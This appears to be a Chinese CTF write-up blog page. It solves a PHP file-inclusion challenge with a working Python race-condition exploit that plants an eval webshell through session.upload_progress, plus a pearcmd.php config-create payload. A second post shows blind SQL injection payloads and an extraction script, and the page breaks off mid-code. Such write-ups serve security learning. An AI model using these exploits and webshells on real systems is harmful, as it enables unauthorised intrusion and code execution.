      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://81.70.102.209:10040/index.php" >http://81.70.102.209:10040/index.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111160105326.png" alt="image-20211116010445092"></p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    show_source(<span class="string">&#x27;./index.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>做题时，试了各种伪协议，最后得出的结论是，allow_url_include=off，所以很多写入的命令我们就无法执行，我们只能查看文件，又查看了一些敏感文件，发现一些文件又没有查看权限，又拿字典扫了一会儿，也没啥收获。</p>
<p>赛后根据出题人提示，去看了p神的一篇博客<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://tttang.com/archive/1312/#toc_0x01%E5%AD%A6%E5%88%B0%E4%BA%86%E4%B8%80%E4%B8%AAsession%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E6%96%B9%E6%B3%95%E3%80%82" >https://tttang.com/archive/1312/#toc_0x01学到了一个session临时文件包含的方法。</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="原理1"   >
          <a href="#原理1" class="heading-link"><i class="fas fa-link"></i></a><a href="#原理1" class="headerlink" title="原理1"></a>原理1</h1>
      
        <h2 id="1-临时文件包含"   >
          <a href="#1-临时文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-临时文件包含" class="headerlink" title="1.临时文件包含"></a>1.临时文件包含</h2>
      <p>我们对任意一个PHP文件发送一个上传的数据包时，<strong>不管这个PHP服务后端是否有处理<code>$_FILES</code>的逻辑，PHP都会将用户上传的数据先保存到一个临时文件中</strong>，这个文件一般位于系统临时目录，文件名是php开头，后面跟6个随机字符；在整个PHP文件执行完毕后，这些上传的临时文件就会被清理掉。</p>
<p>在本题中，我们无从知晓后六位的随机字符，行不太通。</p>

        <h2 id="2-session-upload-progress与Session文件包含"   >
          <a href="#2-session-upload-progress与Session文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-session-upload-progress与Session文件包含" class="headerlink" title="2.session.upload_progress与Session文件包含"></a>2.session.upload_progress与Session文件包含</h2>
      
        <h3 id="1-session-upload-progress"   >
          <a href="#1-session-upload-progress" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-session-upload-progress" class="headerlink" title="1.session.upload_progress"></a>1.session.upload_progress</h3>
      <p>当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是session.upload_progress.prefix与 session.upload_progress.name连接在一起的值</p>
<p>php.ini文件中的session.upload_progress支持：</p>
<figure class="highlight ini"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">session.upload_progress.enabled</span> = <span class="literal">On</span> </span><br><span class="line"><span class="attr">session.upload_progress.cleanup</span> = <span class="literal">On</span> 默认<span class="literal">on</span></span><br><span class="line"></span><br><span class="line"><span class="attr">session.upload_progress.prefix</span> = <span class="string">&quot;upload_progress_&quot;</span> </span><br><span class="line">（session文件里upload_progress的前缀）</span><br><span class="line"><span class="attr">session.upload_progress.name</span> = <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>（post发的请求中需要的参数名，最后会作为session文件里upload_progress的名字）</span><br></pre></td></tr></table></div></figure>

<p>session文件中的示例：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload_progress_POSTNAME|a:5:&#123;s:10:&quot;start_time&quot;;i:1636908253;s:14:&quot;content_length&quot;;i:41312;s:15:&quot;bytes_processed&quot;;i:5301;s:4:&quot;done&quot;.....</span><br></pre></td></tr></table></div></figure>

<p>其中，POSTNAME就是POPST传过去的参数值。</p>

        <h3 id="2-利用原理与条件"   >
          <a href="#2-利用原理与条件" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-利用原理与条件" class="headerlink" title="2.利用原理与条件"></a>2.利用原理与条件</h3>
      <p>PHP在开启了<code>session.upload_progress.enable</code>后（在包括Docker的大部分环境下默认是开启的），将会把用户<strong>上传文件的信息</strong>保存在Session中，<strong>而PHP的Session默认是保存在文件里的</strong>。</p>
<p>PHP中可以通过session progress功能实现临时文件的写入。这种利用方式需要满足下面几个条件：</p>
<ul>
<li>目标环境开启了<code>session.upload_progress.enable</code>选项</li>
<li>发送一个文件上传请求，其中包含一个文件表单和一个名字是<code>PHP_SESSION_UPLOAD_PROGRESS</code>的字段</li>
<li>请求的Cookie中包含Session ID（启用了session）</li>
</ul>
<p>这个方法的原理是，PHP在开启了<code>session.upload_progress.enable</code>后（在包括Docker的大部分环境下默认是开启的），将会把用户上传文件的信息保存在Session中，而PHP的Session默认是保存在文件里的。</p>
<p>所以当攻击者发送满足上述条件的数据包时，就等于能够控制<strong>Session文件内容。</strong></p>
<p><strong>但是PHP中还有另外一个配置项<code>session.upload_progress.cleanup</code>，默认开启。</strong>在这个选项开启时，PHP会在<strong>上传请求被读取完成后自动清理掉这个Session</strong>，<strong>注意：这里session文件不会被删除，但是内容会被清空，所以我们还是要在条件竞争中包含这个session</strong></p>
<p>​    所以，默认情况下，我们需要在Session文件被清理前利用它，这也会用到条件竞争（Race Condition），也就是需要多线程来并发执行，力求在/tmp/sess_PHPSESSID被清除之前，就能执行文件包含，执行我们的木马php命令。</p>

        <h1 id="实现1"   >
          <a href="#实现1" class="heading-link"><i class="fas fa-link"></i></a><a href="#实现1" class="headerlink" title="实现1"></a>实现1</h1>
      <p>直接贴博客中写好的代码，我对其理解写在注释中</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, wait</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;http://81.70.102.209:10040/index.php&#x27;</span></span><br><span class="line">session = requests.session()</span><br><span class="line">flag = <span class="string">&#x27;shellsuccess&#x27;</span><span class="comment">#判断标识/sessionID</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>(<span class="params">e: threading.Event</span>):</span><span class="comment">#多线程，upload发文件</span></span><br><span class="line">   files = [</span><br><span class="line">      (<span class="string">&#x27;file&#x27;</span>, (<span class="string">&#x27;load.png&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">40960</span>, <span class="string">&#x27;image/png&#x27;</span>)),<span class="comment">#制作了一张图片文件</span></span><br><span class="line">   ]</span><br><span class="line">   <span class="comment">#PHP_SESSION_UPLOAD_PROGRESS字段</span></span><br><span class="line">   data = &#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">rf&#x27;&#x27;&#x27;&lt;?php file_put_contents(&#x27;/tmp/success2&#x27;, &#x27;&lt;?php @eval($_POST[&quot;duo&quot;]);?&gt;&#x27;); echo(&#x27;<span class="subst">&#123;flag&#125;</span>&#x27;); ?&gt;&#x27;&#x27;&#x27;</span>&#125;</span><br><span class="line">   <span class="comment">#这句话的意思是在PHP_SESSION_UPLOAD_PROGRESS中写进了一段php代码，这段代码最后会存到/tmp/sess_PHPSESSID中</span></span><br><span class="line">   <span class="comment">#这段php代码把木马写进并创造了/tmp/success这个文件里，然后又在本代码中输出了flag</span></span><br><span class="line">   <span class="comment">#为什么代码会被执行，因为include会把文件内容按php解析并执行，</span></span><br><span class="line">   <span class="comment"># 尽管/tmp/sess_PHPSESSID里还有很多别的信息，它们无法被php解析</span></span><br><span class="line">   <span class="comment">#但&lt;?php ?&gt;内的内容，仍会被正常解析，导致任意命令执行，在这里，我们写入了php木马。</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">while</span> <span class="keyword">not</span> e.is_set():<span class="comment">#e没被set，一直执行</span></span><br><span class="line">      requests.post(<span class="comment">#发包，</span></span><br><span class="line">         target,</span><br><span class="line">         data=data,</span><br><span class="line">         files=files,<span class="comment">#发文件</span></span><br><span class="line">         cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: flag&#125;,<span class="comment">#这是随便写了个PHPSESSID，这个会被放在/tmp/sess_PHPSESSID里</span></span><br><span class="line">      )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">e: threading.Event</span>):</span><span class="comment">#多线程，判断是否程序</span></span><br><span class="line">   <span class="keyword">while</span> <span class="keyword">not</span> e.is_set():</span><br><span class="line">      response = requests.get(</span><br><span class="line">         <span class="string">f&#x27;<span class="subst">&#123;target&#125;</span>?file=/tmp/sess_<span class="subst">&#123;flag&#125;</span>&#x27;</span>,</span><br><span class="line">         <span class="comment">#给文件包含网站发请求，使其包含/tmp/sess_PHPSESSID这个文件</span></span><br><span class="line">         <span class="comment">#而这个文件里有echo(&#x27;&#123;flag&#125;&#x27;);这句话，如果包含成功，则页面上会有&#123;flag&#125;字符回显</span></span><br><span class="line">      )</span><br><span class="line">      <span class="built_in">print</span>(response.content)</span><br><span class="line">      <span class="keyword">if</span> flag.encode() <span class="keyword">in</span> response.content:<span class="comment">#如果&#123;flag&#125;字符回显，说明文件包含成功，也说明文件执行成功了，木马已经写入了/tmp/success</span></span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;木马写入成功&quot;</span>)</span><br><span class="line">         e.<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   futures = []</span><br><span class="line">   event = threading.Event()</span><br><span class="line">   pool = ThreadPoolExecutor(<span class="number">15</span>)<span class="comment">#进程池，15个进程</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">      futures.append(pool.submit(upload, event))</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">      futures.append(pool.submit(write, event))</span><br><span class="line"></span><br><span class="line">   wait(futures)<span class="comment">#应该是执行进程</span></span><br></pre></td></tr></table></div></figure>

<p>解析其中比较重要的代码</p>

        <h2 id="cookies-‘PHPSESSID’-flag"   >
          <a href="#cookies-‘PHPSESSID’-flag" class="heading-link"><i class="fas fa-link"></i></a><a href="#cookies-‘PHPSESSID’-flag" class="headerlink" title="cookies={‘PHPSESSID’: flag},"></a>cookies={‘PHPSESSID’: flag},</h2>
      <p>这句话是自己构造了一个PHPSESSID，这样当session产生临时session文件时，我们就知道它的姓名了，**/tmp/sess_PHPSESSID文件**</p>
<p><img src="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111160108214.png" alt="image-20211115111854684"></p>
<p>这个tmp是系统根目录,不是网站根目录</p>
<p>同样的，这需要<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.php.net/manual/zh/session.configuration.php#ini.session.use-strict-mode" >session.use_strict_mode</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>=Off：产生会话ID</p>
<p><img src="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111160108216.png" alt="image-20211115015332481"></p>

        <h2 id="data"   >
          <a href="#data" class="heading-link"><i class="fas fa-link"></i></a><a href="#data" class="headerlink" title="data"></a>data</h2>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: rf<span class="string">&#x27;&#x27;</span><span class="string">&#x27;&lt;?php file_put_contents(&#x27;</span>/tmp/success2<span class="string">&#x27;, &#x27;</span><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;duo&quot;</span>]);<span class="meta">?&gt;</span><span class="string">&#x27;); echo(&#x27;</span>&#123;flag&#125;<span class="string">&#x27;); ?&gt;&#x27;</span><span class="string">&#x27;&#x27;</span>&#125;</span><br></pre></td></tr></table></div></figure>

<p>我们来解析比较重要的这句话，PHP_SESSION_UPLOAD_PROGRESS是之前我们定下的参数名，（这里是采用了默认的参数名，如果改了的话，这个方法也会失效）</p>
<p>注意，这里生成的/tmp/success2是一个没后缀的文件，但也是文件，被包含时一样被解析为php执行。</p>
<p>rf’’’  ‘’’应该是格式化字符串，</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php file_put_contents(&#x27;/tmp/success2&#x27;, &#x27;&lt;?php @eval($_POST[&quot;duo&quot;]);?&gt;&#x27;); echo(&#x27;&#123;flag&#125;&#x27;); ?&gt;</span><br></pre></td></tr></table></div></figure>

<p> 是我们写入的内容，我们把它写在了上传文件时，临时产生的session文件：/tmp/sess_PHPSESSID中，它的代码内容是</p>
<p>1.创建一个shell文件——/tmp/success2，然后在shell文件中写入’<?php @eval($_POST["duo"]);?>‘</p>
<p>2.输出 echo(‘{flag}’); 这句话的作用是用于判断我们是否写入成功了的。</p>

        <h2 id="验证"   >
          <a href="#验证" class="heading-link"><i class="fas fa-link"></i></a><a href="#验证" class="headerlink" title="验证"></a>验证</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(</span><br><span class="line">         f&#x27;&#123;target&#125;?file=/tmp/sess_&#123;flag&#125;&#x27;,</span><br><span class="line">      )</span><br><span class="line">      if flag.encode() in response.content</span><br></pre></td></tr></table></div></figure>

<p>判断方法是这样的，由于上传文件时临时创建了/tmp/sess_PHPSESSID文件，现在我们要利用include来执行它，那我们怎么判断我们执行成功了呢，就用我们写入的echo(‘{flag}’);来判断，如果我们得到的网页回显中，输出了我们的flag，说明这个/tmp/sess_PHPSESSID文件已经被解析执行了，下面是一个回显的示例：</p>
<p><img src="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111160108217.png" alt="image-20211115015943526"></p>
<p>这样我们的木马就写入成功了，用蚁剑连接，拿到flag:</p>
<p><img src="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111160108218.png" alt="image-20211115020027362"></p>

        <h1 id="原理2"   >
          <a href="#原理2" class="heading-link"><i class="fas fa-link"></i></a><a href="#原理2" class="headerlink" title="原理2"></a>原理2</h1>
      
        <h3 id="pear-pecl、"   >
          <a href="#pear-pecl、" class="heading-link"><i class="fas fa-link"></i></a><a href="#pear-pecl、" class="headerlink" title="pear/pecl、"></a>pear/pecl、</h3>
      
        <h4 id="什么东西"   >
          <a href="#什么东西" class="heading-link"><i class="fas fa-link"></i></a><a href="#什么东西" class="headerlink" title="什么东西"></a>什么东西</h4>
      <p><img src="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111160108219.png" alt="image-20211115215142909"></p>
<p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。</p>
<p>pecl/pear中有一个文件 pearcmd.php。</p>

        <h4 id="利用条件"   >
          <a href="#利用条件" class="heading-link"><i class="fas fa-link"></i></a><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4>
      <p>在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装。</p>
<p>不过，在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在<code>/usr/local/lib/php</code>。</p>
<p>原本它只是一个命令行工具，不在web目录下面，但是我们现在能文件包含，我们可包含到pear中，利用它的命令来做事。</p>

        <h4 id="利用方法"   >
          <a href="#利用方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4>
      
        <h5 id="1-config-create"   >
          <a href="#1-config-create" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-config-create" class="headerlink" title="1.config-create"></a><strong>1.config-create</strong></h5>
      <p><img src="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111160108220.png" alt="image-20211115215513426"></p>
<p>利用它的一个命令，config-create来创建一个文件，它有两个参数，第一个参数是文件内容，第二个参数是写入的路径。</p>

        <h5 id="2-SERVER-‘argv’"   >
          <a href="#2-SERVER-‘argv’" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-SERVER-‘argv’" class="headerlink" title="2.$_SERVER[‘argv’]"></a><strong>2.$_SERVER[‘argv’]</strong></h5>
      <p>​    发现Docker环境下的PHP会开启<code>register_argc_argv</code>这个配置。当开启了这个选项，用户的输入将会被赋予给<code>$argc</code>、<code>$argv</code>、<code>$_SERVER[&#39;argv&#39;]</code>几个变量。他们都是全局变量，为传递给脚本的参数数组——</p>
<p>$argc — 传递给脚本的参数数目</p>
<p>$argv — 传递给脚本的参数数组</p>
<p>而$_SERVER[‘argv’]这个参数是我们可以利用的，argv是命令行参数，RFC3875中规定，如果query-string中不包含<code>=</code>，且请求是GET或HEAD，则query-string需要被作为命令行参数。<strong>也就是说，如果我们传递的参数没有键（参数名），那这个参数就会变成命令行参数argv。</strong></p>
<p>（query-string是指我们在url中传的参数）<img src="https://storage.tttang.com/media/attachment/2021/11/01/661223a3-6bfb-4ef2-ad14-0a6bc53128fa.png" alt="image-20211101072557483.png"></p>
<p>而pear又会去命令行中获取argv：</p>
<p><img src="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111160108221.png" alt="image-20211116005524798"></p>
<p>所以，这就很巧了，我们传入命令行参数argv，再包含pearcmd.php来运行它，也就是运行我们传入的命令，结合它的 config-create 命令创建shell文件。</p>

        <h5 id="3-payload"   >
          <a href="#3-payload" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-payload" class="headerlink" title="3.payload"></a>3.payload</h5>
      <p>最后，得到的payload如下：（p神的）</p>
<p>/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/<?=phpinfo()?>+/tmp/shell.php    </p>
<p>这里的+号是空格的意思，是空格被编码变成了+号，所以最后的命令行参数就是：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config-create //&lt;?=phpinfo()?&gt; /tmp/shell.php</span><br></pre></td></tr></table></div></figure>

<figure class="highlight http"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/shell.php</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></div></figure>

<p>我自己又尝试了一下，我发现去掉<?=phpinfo()?>前面的/也可以运行：</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file=/usr/local/lib/php/pearcmd.php&amp;+config-create+/&amp;<span class="meta">&lt;?=</span>phpinfo()<span class="meta">?&gt;</span>+/tmp/bis2.php</span><br><span class="line">三个参数:</span><br><span class="line">	file=/usr/local/lib/php/pearcmd.php</span><br><span class="line">    +config-create+/</span><br><span class="line">    <span class="meta">&lt;?=</span>phpinfo()<span class="meta">?&gt;</span>+/tmp/bis2.php</span><br></pre></td></tr></table></div></figure>

<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config-create /&lt;?=phpinfo()?&gt; /tmp/shell.php</span><br></pre></td></tr></table></div></figure>

<p>但是config-create / 里的/不能去掉，它应该代表的是根目录的意思，应该是一个固定的参数：</p>
<p><img src="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111160108222.png" alt="image-20211116010232266"></p>
<p>最后，shell被写到了/tmp/shell.php下，成功获取</p>

        <h1 id="收获："   >
          <a href="#收获：" class="heading-link"><i class="fas fa-link"></i></a><a href="#收获：" class="headerlink" title="收获："></a>收获：</h1>
      <p>一篇大神写的好博客强于我在百度搜一整晚</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/11/07/badmac/">badmac</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-11-07</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2021-11-07</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>根据提示，在这个喜闻乐见的框尝试注入</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://123.57.193.197:12334/maccms/index.php/user/login.html" >http://123.57.193.197:12334/maccms/index.php/user/login.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>​    经过一些思考和判断，感觉登录失败是用户名对了密码不对，获取失败是用户名都没查到，但是又感觉如果#没过滤，后面都注释了，那为啥万用密码还返回登录失败，这个其实一直不太懂，就卡了一会儿，可能是题目所赐，最后还是用了以下的猜测：</p>
<p>​    </p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;code&quot;:1003,&quot;msg&quot;:&quot;用户登录失败&quot;&#125; -》true</span><br><span class="line">&#123;&quot;code&quot;:1003,&quot;msg&quot;:&quot;获取用户信息失败&quot;&#125; -》false</span><br></pre></td></tr></table></div></figure>

<p>#是一定要加的，因为#是用来屏蔽后面那句password查询的，一开始还想过两句sql分别执行的情况，但是可能还是我想多了</p>

        <h2 id="1-判断引号闭合"   >
          <a href="#1-判断引号闭合" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-判断引号闭合" class="headerlink" title="1.判断引号闭合"></a>1.判断引号闭合</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">user_name=&#x27; or 1=1 # -》true</span><br><span class="line">&amp;user_pwd=&#x27;</span><br><span class="line"></span><br><span class="line">user_name=&quot; or 1=1 # -》false</span><br><span class="line">&amp;user_pwd=&#x27;</span><br><span class="line">所以是单引号闭合</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-判断布尔注入："   >
          <a href="#2-判断布尔注入：" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-判断布尔注入：" class="headerlink" title="2.判断布尔注入："></a>2.判断布尔注入：</h2>
      <p>注意：这里就不能用and了，因为前面已经是false了</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user_name=&#x27; or 1=1 #  -》true</span><br><span class="line">&amp;user_pwd=&#x27;</span><br><span class="line">user_name=&#x27; or 1=2 #  -》false</span><br><span class="line">&amp;user_pwd=&#x27;</span><br></pre></td></tr></table></div></figure>


        <h2 id="3-爆数据库名："   >
          <a href="#3-爆数据库名：" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-爆数据库名：" class="headerlink" title="3.爆数据库名："></a>3.爆数据库名：</h2>
      <p>这里使用python写脚本</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">base = <span class="string">&#x27;http://localhost:8090/maccms/index.php/user/login.html&#x27;</span></span><br><span class="line">query = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#爆数据库名:</span></span><br><span class="line"><span class="keyword">for</span> position <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):<span class="comment">#表示要查的内容中的第几个字符</span></span><br><span class="line">	ifdone = <span class="number">1</span> <span class="comment">#判断到没到所查字段的长度</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> names:</span><br><span class="line">		query = <span class="string">&quot;&#x27; or ((select substring(database(),%d,1))=&#x27;%c&#x27;) #&quot;</span> % (position, i)</span><br><span class="line">		data = &#123;<span class="string">&quot;user_name&quot;</span>: query, <span class="string">&quot;user_pwd&quot;</span>: <span class="string">&quot;&#x27;&quot;</span>&#125;<span class="comment">#注意,query要先赋值再传进data,不然不能动态赋值的,因为不是引用.</span></span><br><span class="line">		req = requests.post(url=base,data=data)</span><br><span class="line">		<span class="comment"># print(data)</span></span><br><span class="line">		<span class="comment"># print(req.text)</span></span><br><span class="line">		<span class="keyword">if</span> req.text.count(<span class="string">&#x27;用户登录失败&#x27;</span>) == <span class="number">1</span>:</span><br><span class="line">			<span class="built_in">print</span>(i,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">			ifdone = <span class="number">0</span></span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">if</span> ifdone == <span class="number">1</span>:<span class="comment">#如果done=1,说明这轮循环没有字符匹配,则表明爆出了全名</span></span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p><img src="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111071743214.png" alt="image-20211103223237871">数据库名</p>
<p>同理得到user：TSCTFJ</p>

        <h2 id="4-爆表名"   >
          <a href="#4-爆表名" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-爆表名" class="headerlink" title="4.爆表名"></a>4.爆表名</h2>
      <p>同理：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> colunms <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">20</span>):<span class="comment">#表示要查的内容中的第几个字段</span></span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot; 